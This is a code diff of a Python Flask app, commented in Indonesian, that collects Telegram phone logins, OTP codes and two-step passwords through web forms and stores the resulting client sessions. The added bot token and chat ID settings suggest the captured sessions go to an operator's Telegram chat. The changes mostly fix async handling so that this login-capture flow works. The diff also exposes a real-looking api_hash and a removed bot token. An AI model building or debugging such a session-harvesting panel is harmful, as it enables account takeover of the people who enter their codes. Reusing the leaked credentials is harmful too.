@@ -17,13 +17,27 @@ app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 # ========== KONFIG ==========
 api_id = int(os.getenv("API_ID", 16047851))
 api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8205641352:AAHxt3LgmDdfKag-NPQUY4WYOIXsul680Hw")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "xxx")  # ganti token
+CHAT_ID = os.getenv("CHAT_ID", "xxx")
 
 # Pakai folder tmp supaya aman di Railway
 SESSION_DIR = "/tmp/sessions"
 DB_FILE = "/tmp/data.db"
 
 os.makedirs(SESSION_DIR, exist_ok=True)
+
+# ========== FIX UNTUK ASYNCIO ==========
+def run_async(coro):
+    try:
+        loop = asyncio.get_event_loop()
+    except RuntimeError:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+
+    if loop.is_running():
+        return asyncio.ensure_future(coro)
+    else:
+        return loop.run_until_complete(coro)
 
 # ====== DB INIT ======
 def init_db():
@@ -107,7 +121,7 @@ def login():
             await client.disconnect()
 
         try:
-            asyncio.run(send_code())
+            run_async(send_code())
             flash("OTP telah dikirim ke Telegram Anda.")
             return redirect(url_for("otp"))
         except Exception as e:
@@ -141,7 +155,7 @@ def otp():
                 await client.disconnect()
                 return {"ok": False, "error": "OTP salah"}
 
-        res = asyncio.run(verify_code())
+        res = run_async(verify_code())
         if res["ok"]:
             if res.get("need_password"):
                 session["need_password"] = True
@@ -181,7 +195,7 @@ def password():
                 await client.disconnect()
                 return {"ok": False, "error": "Password salah"}
 
-        res = asyncio.run(verify_password())
+        res = run_async(verify_password())
         if res["ok"]:
             flash("Login berhasil ✅", "success")
             return redirect(url_for("success"))
